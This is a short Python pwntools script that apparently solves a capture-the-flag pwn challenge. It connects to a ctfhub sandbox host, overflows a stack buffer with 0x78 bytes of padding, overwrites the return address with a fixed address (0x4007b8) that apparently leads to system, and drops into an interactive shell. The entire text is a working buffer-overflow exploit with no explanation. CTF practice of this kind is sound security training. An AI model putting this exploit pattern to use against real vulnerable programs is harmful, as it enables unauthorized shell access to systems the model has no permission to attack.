from pwn import *

sh = remote('challenge-d347462bda30be53.sandbox.ctfhub.com', 30036)
#sh = process('./pwn')
e = ELF('./pwn')

_system_addr = 0x4007b8
padding = b'a'*(0x70+8)

sh.sendline(padding+p64(_system_addr))
sh.interactive()
